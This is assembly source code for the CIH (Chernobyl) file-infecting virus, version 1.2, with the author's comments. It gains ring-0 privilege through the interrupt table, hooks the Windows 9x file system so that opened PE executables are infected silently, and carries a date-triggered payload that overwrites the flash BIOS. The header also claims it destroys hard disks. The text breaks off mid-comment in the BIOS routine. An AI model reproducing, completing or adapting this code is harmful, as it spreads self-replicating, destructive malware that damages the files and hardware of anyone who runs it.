; ****************************************************************************
; *			The Virus Program Information                        *
; ****************************************************************************
; *                                                                          *
; *	Designer : CIH			Original Place : TTIT of Taiwan      *
; *	Create Date : 04/26/1998	Now Version : 1.2                    *
; *     Modification Time : 05/21/1998                                       *
; *									     *
; *==========================================================================*
; *			Modification History                                 *
; *==========================================================================*
; *	v1.0	1. Create the Virus Program.                                 *
; *		2. The Virus Modifies IDT to Get Ring0 Privilege.            *
; * 04/26/1998  3. Virus Code doesn't Reload into System.                    *
; *		4. Call IFSMgr_InstallFileSystemApiHook to Hook File System. *
; *		5. Modifies Entry Point of IFSMgr_InstallFileSystemApiHook.  *
; *		6. When System Opens Existing PE File, the File will be      *
; *                Infected, and the File doesn't be Reinfected.             *
; *		7. It is also Infected, even the File is Read-Only.          *
; *		8. When the File is Infected, the Modification Date and Time *
; *		   of the File also don't be Changed.                        *
; *		9. When My Virus Uses IFSMgr_Ring0_FileIO, it will not Call  *
; *		   Previous FileSystemApiHook, it will Call the Function     *
; *		   that the IFS Manager Would Normally Call to Implement     *
; *		   this Particular I/O Request.                              *
; *	       10. The Virus Size is only 656 Bytes.                         *
; *==========================================================================*
; *	v1.1	1. Especially, the File that be Infected will not Increase   *
; *		   it's Size...   ^__^					     *
; * 05/15/1998	2. Hook and Modify Structured Exception Handing.	     *
; *		   When Exception Error Occurs, Our OS System should be in   *
; *		   Windows NT. So My Cute Virus will not Continue to Run,    *
; *		   it will Jmup to Original Application to Run.		     *
; *		3. Use Better Algorithm, Reduce Virus Code Size.	     *
; *		4. The Virus "Basic" Size is only 796 Bytes.		     *
; *==========================================================================*
; *	v1.2	1. Kill All HardDisk, and BIOS... Super... Killer...	     *
; *		2. Modify the Bug of v1.1				     *
; * 05/21/1998	3. The Virus "Basic" Size is 1003 Bytes.		     *
; ****************************************************************************

                .586P

; ****************************************************************************
; *             Original PE Executable File(Don't Modify this Section)       *
; ****************************************************************************

OriginalAppEXE  SEGMENT

FileHeader:
                db      04dh, 05ah, 090h, 000h, 003h, 000h, 000h, 000h
                db      004h, 000h, 000h, 000h, 0ffh, 0ffh, 000h, 000h
                db      0b8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
                db      00eh, 01fh, 0bah, 00eh, 000h, 0b4h, 009h, 0cdh
                db      021h, 0b8h, 001h, 04ch, 0cdh, 021h, 054h, 068h
                db      069h, 073h, 020h, 070h, 072h, 06fh, 067h, 072h
                db      061h, 06dh, 020h, 063h, 061h, 06eh, 06eh, 06fh
                db      074h, 020h, 062h, 065h, 020h, 072h, 075h, 06eh
                db      020h, 069h, 06eh, 020h, 044h, 04fh, 053h, 020h
                db      06dh, 06fh, 064h, 065h, 02eh, 00dh, 00dh, 00ah
                db      024h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      050h, 045h, 000h, 000h, 04ch, 001h, 001h, 000h
                db      0f1h, 068h, 020h, 035h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 0e0h, 000h, 00fh, 001h
                db      00bh, 001h, 005h, 000h, 000h, 010h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      010h, 010h, 000h, 000h, 000h, 010h, 000h, 000h
                db      000h, 020h, 000h, 000h, 000h, 000h, 040h, 000h
                db      000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
                db      004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      004h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 020h, 000h, 000h, 000h, 002h, 000h, 000h
                db      000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
                db      000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
                db      000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
                db      000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      02eh, 074h, 065h, 078h, 074h, 000h, 000h, 000h
                db      000h, 010h, 000h, 000h, 000h, 010h, 000h, 000h
                db      000h, 010h, 000h, 000h, 000h, 002h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 020h, 000h, 000h, 060h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
                db      0c3h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		dd	00000000h, VirusSize

OriginalAppEXE  ENDS

; ****************************************************************************
; *                     My Virus Game                                        *
; ****************************************************************************

; *********************************************************
; *                    Constant Define                    *
; *********************************************************

TRUE			=	1
FALSE			=	0

DEBUG			=	TRUE

MajorVirusVersion	=	1
MinorVirusVersion	=	2

VirusVersion		=	MajorVirusVersion*10h+MinorVirusVersion


IF	DEBUG

	FirstKillHardDiskNumber	=	81h
	HookExceptionNumber     =       05h

ELSE

	FirstKillHardDiskNumber	=	80h
	HookExceptionNumber     =       03h

ENDIF


FileNameBufferSize	=	7fh

; *********************************************************
; *********************************************************

VirusGame               SEGMENT

                        ASSUME  CS:VirusGame, DS:VirusGame, SS:VirusGame
                        ASSUME  ES:VirusGame, FS:VirusGame, GS:VirusGame

; *********************************************************
; *             Ring3 Virus Game Initial Program          *
; *********************************************************

MyVirusStart:
			push	ebp

; *************************************
; * Let's Modify Structured Exception *
; * Handing, Prevent Exception Error  *
; * Occurrence, Especially in NT.     *
; *************************************

			lea	eax, [esp-04h*2]

			xor	ebx, ebx
			xchg	eax, fs:[ebx]

			call	@0
@0:
			pop	ebx

			lea	ecx, StopToRunVirusCode-@0[ebx]
			push	ecx

			push	eax

; *************************************
; * Let's Modify                      *
; * IDT(Interrupt Descriptor Table)   *
; * to Get Ring0 Privilege...         *
; *************************************

			push	eax		;
                        sidt    [esp-02h]       ; Get IDT Base Address
                        pop     ebx             ;

                        add     ebx, HookExceptionNumber*08h+04h ; ZF = 0

			cli

                        mov     ebp, [ebx]      ; Get Exception Base
                        mov     bp, [ebx-04h]   ; Entry Point

                        lea     esi, MyExceptionHook-@1[ecx]

			push	esi

			mov	[ebx-04h], si		;
			shr	esi, 16			; Modify Exception
			mov	[ebx+02h], si		; Entry Point Address

			pop	esi

; *************************************
; * Generate Exception to Get Ring0   *
; *************************************

			int	HookExceptionNumber	; GenerateException
ReturnAddressOfEndException	=	$

; *************************************
; * Merge All Virus Code Section      *
; *************************************

			push	esi
			mov	esi, eax

LoopOfMergeAllVirusCodeSection:

			mov	ecx, [eax-04h]

			rep	movsb

			sub	eax, 08h

			mov	esi, [eax]

			or	esi, esi
			jz	QuitLoopOfMergeAllVirusCodeSection ; ZF = 1

			jmp	LoopOfMergeAllVirusCodeSection

QuitLoopOfMergeAllVirusCodeSection:

			pop	esi

; *************************************
; * Generate Exception Again          *
; *************************************

			int	HookExceptionNumber	; GenerateException Again

; *************************************
; * Let's Restore                     *
; * Structured Exception Handing      *
; *************************************

ReadyRestoreSE:
			sti

			xor	ebx, ebx

			jmp	RestoreSE

; *************************************
; * When Exception Error Occurs,      *
; * Our OS System should be in NT.    *
; * So My Cute Virus will not         *
; * Continue to Run, it Jmups to      *
; * Original Application to Run.      *
; *************************************

StopToRunVirusCode:
@1			=	StopToRunVirusCode

			xor	ebx, ebx
			mov	eax, fs:[ebx]
			mov	esp, [eax]

RestoreSE:
			pop	dword ptr fs:[ebx]
			pop	eax

; *************************************
; * Return Original App to Execute    *
; *************************************

			pop	ebp

                        push    00401000h       ; Push Original
OriginalAddressOfEntryPoint	=	$-4	; App Entry Point to Stack

                        ret     ; Return to Original App Entry Point

; *********************************************************
; *             Ring0 Virus Game Initial Program          *
; *********************************************************

MyExceptionHook:
@2			=	MyExceptionHook

			jz	InstallMyFileSystemApiHook

; *************************************
; * Do My Virus Exist in System !?    *
; *************************************

			mov	ecx, dr0
			jecxz	AllocateSystemMemoryPage

			add	dword ptr [esp], ReadyRestoreSE-ReturnAddressOfEndException

; *************************************
; * Return to Ring3 Initial Program   *
; *************************************

ExitRing0Init:
			mov	[ebx-04h], bp	;
			shr	ebp, 16		; Restore Exception
			mov	[ebx+02h], bp	;

			iretd

; *************************************
; * Allocate SystemMemory Page to Use *
; *************************************

AllocateSystemMemoryPage:

			mov	dr0, ebx	; Set the Mark of My Virus Exist in System

			push	00000000fh	;
			push	ecx		;
			push	0ffffffffh	;
			push	ecx		;
			push	ecx		;
			push	ecx		;
			push	000000001h	;
			push	000000002h	;
			int	20h		; VMMCALL _PageAllocate
_PageAllocate		=	$		;
			dd	00010053h	; Use EAX, ECX, EDX, and flags
			add	esp, 08h*04h

			xchg	edi, eax	; EDI = SystemMemory Start Address

			lea	eax, MyVirusStart-@2[esi]

			iretd	; Return to Ring3 Initial Program

; *************************************
; * Install My File System Api Hook   *
; *************************************

InstallMyFileSystemApiHook:

			lea	eax, FileSystemApiHook-@6[edi]

			push	eax  ;
			int	20h  ; VXDCALL IFSMgr_InstallFileSystemApiHook
IFSMgr_InstallFileSystemApiHook	=	$	;
			dd      00400067h	; Use EAX, ECX, EDX, and flags

			mov	dr0, eax	; Save OldFileSystemApiHook Address

			pop	eax	; EAX = FileSystemApiHook Address

			; Save Old IFSMgr_InstallFileSystemApiHook Entry Point
			mov	ecx, IFSMgr_InstallFileSystemApiHook-@2[esi]
			mov	edx, [ecx]
			mov	OldInstallFileSystemApiHook-@3[eax], edx

			; Modify IFSMgr_InstallFileSystemApiHook Entry Point
			lea	eax, InstallFileSystemApiHook-@3[eax]
			mov	[ecx], eax

			cli

			jmp	ExitRing0Init

; *********************************************************
; *             Code Size of Merge Virus Code Section     *
; *********************************************************

CodeSizeOfMergeVirusCodeSection		=	offset $

; *********************************************************
; *             IFSMgr_InstallFileSystemApiHook           *
; *********************************************************

InstallFileSystemApiHook:
			push	ebx

			call	@4	;
@4:					;
			pop	ebx	; mov ebx, offset FileSystemApiHook
			add	ebx, FileSystemApiHook-@4	;

			push	ebx
			int	20h  ; VXDCALL IFSMgr_RemoveFileSystemApiHook
IFSMgr_RemoveFileSystemApiHook	=	$
			dd      00400068h	; Use EAX, ECX, EDX, and flags
			pop	eax

			; Call Original IFSMgr_InstallFileSystemApiHook
			; to Link Client FileSystemApiHook
			push	dword ptr [esp+8]
			call	OldInstallFileSystemApiHook-@3[ebx]
			pop	ecx

			push	eax

			; Call Original IFSMgr_InstallFileSystemApiHook
			; to Link My FileSystemApiHook
			push	ebx
			call	OldInstallFileSystemApiHook-@3[ebx]
			pop	ecx

			mov	dr0, eax	; Adjust OldFileSystemApiHook Address

			pop	eax

			pop	ebx

			ret

; *********************************************************
; *			Static Data                       *
; *********************************************************

OldInstallFileSystemApiHook	dd	?

; *********************************************************
; *             IFSMgr_FileSystemHook                     *
; *********************************************************

; *************************************
; * IFSMgr_FileSystemHook Entry Point *
; *************************************

FileSystemApiHook:
@3			=	FileSystemApiHook

			pushad

                        call    @5	;
@5:					;
                        pop     esi	; mov esi, offset VirusGameDataStartAddress
                        add     esi, VirusGameDataStartAddress-@5

; *************************************
; * Is OnBusy !?                      *
; *************************************

			test	byte ptr (OnBusy-@6)[esi], 01h	; if ( OnBusy )
			jnz	pIFSFunc			; goto pIFSFunc

; *************************************
; * Is OpenFile !?                    *
; *************************************

			; if ( NotOpenFile )
			; goto prevhook
			lea	ebx, [esp+20h+04h+04h]
			cmp	dword ptr [ebx], 00000024h
			jne	prevhook

; *************************************
; * Enable OnBusy                     *
; *************************************

			inc	byte ptr (OnBusy-@6)[esi]	; Enable OnBusy

; *************************************
; * Get FilePath's DriveNumber,       *
; * then Set the DriveName to         *
; * FileNameBuffer.                   *
; *************************************
; * Ex. If DriveNumber is 03h,        *
; *     DriveName is 'C:'.            *
; *************************************

			; mov esi, offset FileNameBuffer
			add	esi, FileNameBuffer-@6

			push	esi

			mov	al, [ebx+04h]
			cmp	al, 0ffh
			je	CallUniToBCSPath

			add	al, 40h
			mov	ah, ':'

			mov	[esi], eax

			inc	esi
			inc	esi

; *************************************
; * UniToBCSPath                      *
; *************************************
; * This Service Converts             *
; * a Canonicalized Unicode Pathname  *
; * to a Normal Pathname in the       *
; * Specified BCS Character Set.      *
; *************************************

CallUniToBCSPath:
			push	00000000h
			push	FileNameBufferSize
			mov	ebx, [ebx+10h]
			mov	eax, [ebx+0ch]
			add	eax, 04h
			push	eax
			push	esi
			int	20h	; VXDCall UniToBCSPath
UniToBCSPath		=	$
			dd	00400041h
			add	esp, 04h*04h

; *************************************
; * Is FileName '.EXE' !?             *
; *************************************

			; cmp [esi+eax-04h], '.EXE'
			cmp	[esi+eax-04h], 'EXE.'
			pop	esi
			jne	DisableOnBusy

IF	DEBUG

; *************************************
; * Only for Debug                    *
; *************************************

			; cmp [esi+eax-06h], 'FUCK'
			cmp	[esi+eax-06h], 'KCUF'
			jne	DisableOnBusy

ENDIF

; *************************************
; * Is Open Existing File !?          *
; *************************************

			; if ( NotOpenExistingFile )
			; goto DisableOnBusy
			cmp	word ptr [ebx+18h], 01h
			jne	DisableOnBusy

; *************************************
; * Get Attributes of the File        *
; *************************************

			mov	ax, 4300h
			int	20h	; VXDCall IFSMgr_Ring0_FileIO
IFSMgr_Ring0_FileIO	=	$
			dd	00400032h

			jc	DisableOnBusy

			push	ecx

; *************************************
; * Get IFSMgr_Ring0_FileIO Address   *
; *************************************

			mov	edi, dword ptr (IFSMgr_Ring0_FileIO-@7)[esi]
			mov	edi, [edi]

; *************************************
; * Is Read-Only File !?              *
; *************************************

			test	cl, 01h
			jz	OpenFile

; *************************************
; * Modify Read-Only File to Write    *
; *************************************

			mov	ax, 4301h
			xor	ecx, ecx
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Open File                         *
; *************************************

OpenFile:
			xor	eax, eax
			mov	ah, 0d5h
			xor	ecx, ecx
			xor	edx, edx
			inc	edx
			mov	ebx, edx
			inc	ebx
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

			xchg	ebx, eax	; mov ebx, FileHandle

; *************************************
; * Need to Restore                   *
; * Attributes of the File !?         *
; *************************************

			pop	ecx

			pushf

			test	cl, 01h
			jz	IsOpenFileOK

; *************************************
; * Restore Attributes of the File    *
; *************************************

			mov	ax, 4301h
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Is Open File OK !?                *
; *************************************

IsOpenFileOK:
			popf

			jc	DisableOnBusy

; *************************************
; * Open File Already Succeed.   ^__^ *
; *************************************

			push	esi	; Push FileNameBuffer Address to Stack

			pushf		; Now CF = 0, Push Flag to Stack

			add	esi, DataBuffer-@7 ; mov esi, offset DataBuffer

; ***************************
; * Get OffsetToNewHeader   *
; ***************************

			xor	eax, eax
			mov	ah, 0d6h

			; For Doing Minimal VirusCode's Length,
			; I Save EAX to EBP.
			mov	ebp, eax

			xor	ecx, ecx
			mov	cl, 04h
			xor	edx, edx
			mov	dl, 3ch
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

			mov	edx, [esi]

; ***************************
; * Get 'PE\0' Signature    *
; * of ImageFileHeader, and *
; * Infected Mark.          *
; ***************************

			dec	edx

			mov	eax, ebp
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; ***************************
; * Is PE !?                *
; ***************************
; * Is the File             *
; * Already Infected !?     *
; ***************************

			; cmp [esi], '\0PE\0'
			cmp	dword ptr [esi], 00455000h
			jne	CloseFile

; *************************************
; * The File is                   ^o^ *
; * PE(Portable Executable) indeed.   *
; *************************************
; * The File isn't also Infected.     *
; *************************************

; *************************************
; * Start to Infect the File          *
; *************************************
; * Registers Use Status Now :        *
; *                                   *
; * EAX = 04h                         *
; * EBX = File Handle                 *
; * ECX = 04h                         *
; * EDX = 'PE\0\0' Signature of       *
; *       ImageFileHeader Pointer's   *
; *	  Former Byte.                *
; * ESI = DataBuffer Address ==> @8   *
; * EDI = IFSMgr_Ring0_FileIO Address *
; * EBP = D600h ==> Read Data in File *
; *************************************
; * Stack Dump :                      *
; *                                   *
; * ESP => -------------------------  *
; *        |       EFLAG(CF=0)     |  *
; *        -------------------------  *
; *        | FileNameBufferPointer |  *
; *        -------------------------  *
; *        |          EDI          |  *
; *        -------------------------  *
; *        |          ESI          |  *
; *        -------------------------  *
; *        |          EBP          |  *
; *        -------------------------  *
; *        |          ESP          |  *
; *        -------------------------  *
; *        |          EBX          |  *
; *        -------------------------  *
; *        |          EDX          |  *
; *        -------------------------  *
; *        |          ECX          |  *
; *        -------------------------  *
; *        |          EAX          |  *
; *        -------------------------  *
; *        |     Return Address    |  *
; *        -------------------------  *
; *************************************

			push	ebx	; Save File Handle

			push	00h	; Set VirusCodeSectionTableEndMark

; ***************************
; * Let's Set the           *
; * Virus' Infected Mark    *
; ***************************

			push	01h	; Size
			push	edx	; Pointer of File
			push	edi	; Address of Buffer

; ***************************
; * Save ESP Register       *
; ***************************

			mov	dr1, esp

; ***************************
; * Let's Set the           *
; * NewAddressOfEntryPoint  *
; * ( Only First Set Size ) *
; ***************************

			push	eax	; Size

; ***************************
; * Let's Read              *
; * Image Header in File    *
; ***************************

			mov	eax, ebp
			mov	cl, SizeOfImageHeaderToRead
			add	edx, 07h ; Move EDX to NumberOfSections
			call	edi	 ; VXDCall IFSMgr_Ring0_FileIO

; ***************************
; * Let's Set the           *
; * NewAddressOfEntryPoint  *
; * ( Set Pointer of File,  *
; *   Address of Buffer   ) *
; ***************************

			lea	eax, (AddressOfEntryPoint-@8)[edx]
			push	eax	; Pointer of File

			lea	eax, (NewAddressOfEntryPoint-@8)[esi]
			push	eax	; Address of Buffer

; ***************************
; * Move EDX to the Start   *
; * of SectionTable in File *
; ***************************

			movzx	eax, word ptr (SizeOfOptionalHeader-@8)[esi]
			lea	edx, [eax+edx+12h]

; ***************************
; * Let's Get               *
; * Total Size of Sections  *
; ***************************

			mov	al, SizeOfScetionTable

			; I Assume NumberOfSections <= 0ffh
			mov	cl, (NumberOfSections-@8)[esi]

			mul	cl

; ***************************
; * Let's Set Section Table *
; ***************************

			; Move ESI to the Start of SectionTable
			lea	esi, (StartOfSectionTable-@8)[esi]

			push	eax	; Size
			push	edx	; Pointer of File
			push	esi	; Address of Buffer

; ***************************
; * The Code Size of Merge  *
; * Virus Code Section and  *
; * Total Size of Virus     *
; * Code Section Table Must *
; * be Small or Equal the   *
; * Unused Space Size of    *
; * Following Section Table *
; ***************************

			inc	ecx
			push	ecx	; Save NumberOfSections+1

			shl	ecx, 03h
			push	ecx	; Save TotalSizeOfVirusCodeSectionTable

			add	ecx, eax
			add	ecx, edx

			sub	ecx, (SizeOfHeaders-@9)[esi]
			jnc	short OnlySetInfectedMark

			not	ecx
			inc	ecx

			cmp	cx, small CodeSizeOfMergeVirusCodeSection
			jb	OnlySetInfectedMark

; ***************************
; * Save Original           *
; * Address of Entry Point  *
; ***************************

			; Save My Virus First Section Code
			; Size of Following Section Table...
			; ( Not Include the Size of Virus Code Section Table )
			push	ecx

			xchg	ecx, eax	; ECX = Size of Section Table

			mov	eax, (AddressOfEntryPoint-@9)[esi]
			add	eax, (ImageBase-@9)[esi]
			mov	(OriginalAddressOfEntryPoint-@9)[esi], eax

; ***************************
; * Read All Section Tables *
; ***************************

			mov	eax, ebp
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; ***************************
; * Let's Set Total Virus   *
; * Code Section Table      *
; ***************************

			; EBX = My Virus First Section Code
			;	Size of Following Section Table
			pop	ebx
			pop	edi	; EDI = TotalSizeOfVirusCodeSectionTable
			pop	ecx	; ECX = NumberOfSections+1

			push	edi		; Size

			add	edx, eax
			push	edx		; Pointer of File

			add	eax, esi
			push	eax		; Address of Buffer

; ***************************
; * Set the First Virus     *
; * Code Section Size in    *
; * VirusCodeSectionTable   *
; ***************************

			lea	eax, [eax+edi-04h]
			mov	[eax], ebx

; ***************************
; * Let's Set My Virus      *
; * First Section Code      *
; ***************************

			push	ebx	; Size

			add	edx, edi
			push	edx	; Pointer of File

			lea	edi, (MyVirusStart-@9)[esi]
			push	edi	; Address of Buffer

; ***************************
; * Let's Modify the        *
; * AddressOfEntryPoint to  *
; * My Virus Entry Point    *
; ***************************

			mov	(NewAddressOfEntryPoint-@9)[esi], edx

; ***************************
; * Setup Initial Data      *
; ***************************

			lea	edx, [esi-SizeOfScetionTable]
			mov	ebp, offset VirusSize

			jmp	StartToWriteCodeToSections

; ***************************
; * Write Code to Sections  *
; ***************************

LoopOfWriteCodeToSections:

			add	edx, SizeOfScetionTable

			mov	ebx, (SizeOfRawData-@9)[edx]
			sub	ebx, (VirtualSize-@9)[edx]
			jbe	EndOfWriteCodeToSections

			push	ebx	; Size

			sub	eax, 08h
			mov	[eax], ebx

			mov	ebx, (PointerToRawData-@9)[edx]
			add	ebx, (VirtualSize-@9)[edx]
			push	ebx	; Pointer of File

			push	edi	; Address of Buffer

			mov	ebx, (VirtualSize-@9)[edx]
			add	ebx, (VirtualAddress-@9)[edx]
			add	ebx, (ImageBase-@9)[esi]
			mov	[eax+4], ebx

			mov	ebx, [eax]
			add	(VirtualSize-@9)[edx], ebx

			; Section contains initialized data ==> 00000040h
			; Section can be Read.              ==> 40000000h
			or	(Characteristics-@9)[edx], 40000040h

StartToWriteCodeToSections:

			sub	ebp, ebx
			jbe	SetVirusCodeSectionTableEndMark

			add	edi, ebx	; Move Address of Buffer

EndOfWriteCodeToSections:

			loop	LoopOfWriteCodeToSections

; ***************************
; * Only Set Infected Mark  *
; ***************************

OnlySetInfectedMark:
			mov	esp, dr1

			jmp	WriteVirusCodeToFile

; ***************************
; * Set Virus Code          *
; * Section Table End Mark  *
; ***************************

SetVirusCodeSectionTableEndMark:

			; Adjust Size of Virus Section Code to Correct Value
			add	[eax], ebp
			add	[esp+08h], ebp

			; Set End Mark
			xor	ebx, ebx
			mov	[eax-04h], ebx

; ***************************
; * When VirusGame Calls    *
; * VxDCall, VMM Modifies   *
; * the 'int 20h' and the   *
; * 'Service Identifier'    *
; * to 'Call [XXXXXXXX]'.   *
; ***************************
; * Before Writing My Virus *
; * to File, I Must Restore *
; * them First.     ^__^    *
; ***************************

			lea	eax, (LastVxDCallAddress-2-@9)[esi]

			mov	cl, VxDCallTableSize

LoopOfRestoreVxDCallID:
			mov	word ptr [eax], 20cdh

			mov	edx, (VxDCallIDTable+(ecx-1)*04h-@9)[esi]
			mov	[eax+2], edx

			movzx	edx, byte ptr (VxDCallAddressTable+ecx-1-@9)[esi]
			sub	eax, edx

			loop	LoopOfRestoreVxDCallID

; ***************************
; * Let's Write             *
; * Virus Code to the File  *
; ***************************

WriteVirusCodeToFile:
			mov	eax, dr1
			mov	ebx, [eax+10h]
			mov	edi, [eax]

LoopOfWriteVirusCodeToFile:

			pop	ecx
			jecxz	SetFileModificationMark

			mov	esi, ecx
			mov	eax, 0d601h
			pop	edx
			pop	ecx

			call	edi	; VXDCall IFSMgr_Ring0_FileIO

			jmp	LoopOfWriteVirusCodeToFile

; ***************************
; * Let's Set CF = 1 ==>    *
; * Need to Restore File    *
; * Modification Time       *
; ***************************

SetFileModificationMark:
			pop	ebx
			pop	eax

			stc		; Enable CF(Carry Flag)
			pushf

; *************************************
; * Close File                        *
; *************************************

CloseFile:
			xor	eax, eax
			mov	ah, 0d7h
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Need to Restore File Modification *
; * Time !?                           *
; *************************************

			popf
			pop	esi
			jnc	IsKillComputer

; *************************************
; * Restore File Modification Time    *
; *************************************

			mov	ebx, edi

			mov	ax, 4303h
			mov	ecx, (FileModificationTime-@7)[esi]
			mov	edi, (FileModificationTime+2-@7)[esi]
			call	ebx	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Disable OnBusy                    *
; *************************************

DisableOnBusy:
			dec	byte ptr (OnBusy-@7)[esi]	; Disable OnBusy

; *************************************
; * Call Previous FileSystemApiHook   *
; *************************************

prevhook:
			popad

			mov	eax, dr0	;
			jmp	[eax]		; Jump to prevhook

; *************************************
; * Call the Function that the IFS    *
; * Manager Would Normally Call to    *
; * Implement this Particular I/O     *
; * Request.                          *
; *************************************

pIFSFunc:
			mov	ebx, esp
			push	dword ptr [ebx+20h+04h+14h]	; Push pioreq
			call	[ebx+20h+04h]			; Call pIFSFunc
			pop	ecx				;

			mov	[ebx+1ch], eax	; Modify EAX Value in Stack

; ***************************
; * After Calling pIFSFunc, *
; * Get Some Data from the  *
; * Returned pioreq.        *
; ***************************

			cmp	dword ptr [ebx+20h+04h+04h], 00000024h
			jne	QuitMyVirusFileSystemHook

; *****************
; * Get the File  *
; * Modification  *
; * Date and Time *
; * in DOS Format.*
; *****************

			mov	eax, [ecx+28h]
			mov	(FileModificationTime-@6)[esi], eax

; ***************************
; * Quit My Virus'          *
; * IFSMgr_FileSystemHook   *
; ***************************

QuitMyVirusFileSystemHook:

			popad

			ret

; *************************************
; * Kill Computer !? ...   *^_^*      *
; *************************************

IsKillComputer:
			; Get Now Month from BIOS CMOS
			mov	ax, 0708h
			out	70h, al
			in	al, 71h

			xchg	ah, al

			; Get Now Day from BIOS CMOS
			out	70h, al
			in	al, 71h

			xor	ax, 0426h	; 04/26/????
			jne	DisableOnBusy

; **************************************
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; * Kill Kill Kill Kill Kill Kill Kill *
; **************************************

; ***************************
; * Kill BIOS EEPROM        *
; ***************************

			mov	bp, 0cf8h
			lea	esi, IOForEEPROM-@7[esi]

; ***********************
; * Show BIOS Page in   *
; * 000E0000 - 000EFFFF *
; *    (   64 KB   )    *
; ***********************

			mov	edi, 8000384ch
			mov	dx, 0cfeh
			cli
			call	esi

; ***********************
; * Show BIOS Page in   *
; * 000F0000 - 000FFFFF *
; *    (   64 KB   )    *
; ***********************

			mov	di, 0058h
			dec	edx					; and al,0fh
			mov	word ptr (BooleanCalculateCode-@10)[esi], 0f24h
			call	esi

; ***********************
; * Show the BIOS Extra *
; * ROM Data in Memory  *
; * 000E0000 - 000E01FF *
; *   (   512 Bytes   ) *
; * , and the Section   *
; * of Extra BIOS can   *
; * be Writted...       *
; ***********************

			lea	ebx, EnableEEPROMToWrite-@10[esi]

			mov	eax, 0e5555h
			mov	ecx, 0e2aaah
			call	ebx
			mov	byte ptr [eax], 60h

			push	ecx
			loop	$

; ***********************
; * Kill the BIOS Extra *
; * ROM Data in Memory  *
; * 000E0000 - 000E007F *
; *   (   80h Bytes   ) *
; ***********************

			xor	ah, ah
			mov	[eax], al

			xchg	ecx, eax
			loop	$

; ***********************
; * Show and Enable the *
; * BIOS Main ROM Data  *
; * 000E0000 - 000FFFFF *
; *   (   128 KB   )    *
; * can be Writted...   *
; ***********************

			mov	eax, 0f5555h
			pop	ecx
			mov	ch, 0aah
			call	ebx
			mov	byte ptr [eax], 20h

			loop	$

; ***********************
; * Kill the BIOS Main  *
; * ROM Data in Memory  *
; * 000FE000 - 000FE07F *
; *   (   80h Bytes   ) *
; ***********************

			mov	ah, 0e0h
			mov	[eax], al

; ***********************
; * Hide BIOS Page in   *
